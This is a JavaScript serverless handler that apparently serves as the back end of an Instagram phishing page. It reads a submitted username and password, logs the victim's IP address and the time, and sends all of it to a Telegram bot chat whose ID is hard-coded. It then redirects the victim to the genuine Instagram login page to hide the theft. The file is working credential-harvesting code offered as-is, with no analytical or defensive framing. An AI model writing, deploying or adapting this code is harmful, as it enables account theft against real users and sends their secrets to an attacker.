export default async function handler(req, res) {
    // Handle preflight
    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    if (req.method !== 'POST') {
        res.writeHead(405, { 'Content-Type': 'text/plain' });
        res.end('Method Not Allowed');
        return;
    }

    const { username, password } = req.body;
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'unknown';
    const ts = new Date().toISOString();

    const text = `🎯 Instagram Credentials!\n👤 Username: ${username}\n🔑 Password: ${password}\n🌐 IP: ${ip}\n🕐 Time: ${ts}`;

    try {
        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '6797160131';
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
    } catch (e) {
        console.error(e);
    }

    res.writeHead(302, { Location: 'https://www.instagram.com/accounts/login/' });
    res.end();
}